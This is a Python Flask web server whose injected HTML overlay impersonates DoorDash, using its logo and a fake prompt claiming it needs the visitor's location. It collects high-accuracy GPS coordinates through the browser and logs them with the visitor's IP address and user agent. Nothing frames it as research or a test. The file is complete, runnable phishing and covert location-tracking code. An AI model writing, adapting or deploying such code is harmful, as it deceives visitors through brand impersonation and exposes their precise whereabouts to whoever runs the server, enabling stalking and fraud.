from flask import Flask, request, jsonify
import logging
from datetime import datetime
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Your existing page.html content (replace with your actual content)
PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Your Page</title>
    <!-- Your existing head content -->
</head>
<body>
    <!-- Your existing body content -->
</body>
</html>
"""

GPS_OVERLAY_CODE = """
<style>
    #gps-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0,0,0,0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }
    #gps-prompt {
        background: white;
        padding: 20px;
        border-radius: 10px;
        text-align: center;
        max-width: 400px;
    }
    #allow-btn {
        background-color: #FF3008;
        color: white;
        border: none;
        padding: 10px 20px;
        margin-top: 15px;
        border-radius: 5px;
        cursor: pointer;
        font-weight: bold;
    }
</style>

<div id="gps-overlay">
    <div id="gps-prompt">
        <img src="https://cdn.doordash.com/managed/consumer/seo/doordash_seo_desktop.png" width="100" alt="Doordash">
        <h2>Doordash needs your location to find restaurants near you</h2>
        <button id="allow-btn">Allow Location Access</button>
    </div>
</div>

<script>
    document.getElementById('allow-btn').addEventListener('click', function() {
        fetch('/request_permission', { method: 'POST' })
        .then(() => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        fetch('/log_location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            })
                        }).then(() => {
                            document.getElementById('gps-overlay').remove();
                        });
                    },
                    error => {
                        console.error("Location error:", error);
                        alert("Location access is required for this service.");
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                alert("Geolocation not supported by your browser.");
            }
        });
    });
</script>
"""

def inject_gps_code(html):
    """Inject GPS code before the closing </body> tag"""
    return html.replace('</body>', GPS_OVERLAY_CODE + '\n</body>')

@app.route('/')
def home():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    logger.info(f"Page accessed - IP: {client_ip}, UA: {user_agent}")
    
    return inject_gps_code(PAGE_HTML)

@app.route('/request_permission', methods=['POST'])
def request_permission():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Permission requested - IP: {client_ip}")
    return jsonify({'status': 'success'})

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Location received - IP: {client_ip}, Lat: {data['latitude']}, Lon: {data['longitude']}")
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
